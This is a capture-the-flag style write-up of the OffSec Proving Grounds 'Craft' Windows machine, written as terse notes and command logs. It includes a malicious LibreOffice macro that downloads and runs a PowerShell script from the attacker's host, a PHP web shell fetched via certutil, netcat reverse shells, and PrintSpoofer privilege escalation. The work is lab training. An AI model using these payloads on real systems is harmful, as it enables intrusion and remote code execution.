###### tags: `Offsec` `PG Practice` `Intermediate` `Windows` # Craft
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.218.169 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.176.169:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
``` upload`.odt`,First`libreoffice`
> Refer to
https://0xdf.gitlab.io/2020/02/01/htb-re.html?source=post_page-----c92de878e004--------------------------------
```
┌──(kali㉿kali)-[~/pgplay]
└─$ sudo apt-get install libreoffice 

┌──(kali㉿kali)-[~/pgplay]
└─$ libreoffice
``` `Writer Document -> Tools -> Macros -> Organize Macros -> Basic -> macro from -> New -> evil`,Refer to
```
Sub Main

    Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.184/oneliner.ps1')""")
    
End Sub
```,open`Tools -> Customize -> Open Document -> Macro -> evil` ![Craft_1.png](picture/Craft_1.png),Open nc,upload.odt,`C:\Users\thecybergeek\Desktop`get local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

PS C:\Users\thecybergeek\Desktop> type local.txt
a5bcba022f6a299797c980ddb6de283d
``` `C:\xampp\htdocs`pathto seephp,canuploadphpreverseshell,find,probably(ps1),Firstuploadshell,upload`oneliner.ps1`,cmd
```
PS C:\xampp\htdocs> certutil.exe -urlcache -f http://192.168.45.184/s.php s.php

http://192.168.176.169/s.php?cmd=whoami
craft\apache

192.168.176.169/s.php?cmd=certutil.exe -urlcache -f http://192.168.45.184/oneliner.ps1 oneliner.ps1

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9002

192.168.176.169/s.php?cmd=cmd /c powershell -c C:/xampp/htdocs/oneliner.ps1
``` Check`whoami /priv`use`printspoofer`
```
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9003

PS C:\Users\Public\Documents> certutil.exe -urlcache -f http://192.168.45.184/PrintSpoofer64.exe PrintSpoofer.exe

PS C:\Users\Public\Documents> certutil.exe -urlcache -f http://192.168.45.184/nc.exe nc.exe

PS C:\Users\Public\Documents> ./PrintSpoofer.exe -i -c "C:\Users\Public\Documents\nc.exe 192.168.45.184 9003 -e cmd"
``` wait for reverse shell`C:\Users\Administrator\Desktop`get proof.txt
```
C:\Users\Administrator\Desktop>type proof.txt
724027d57a6610494dcb82d9880c1705
```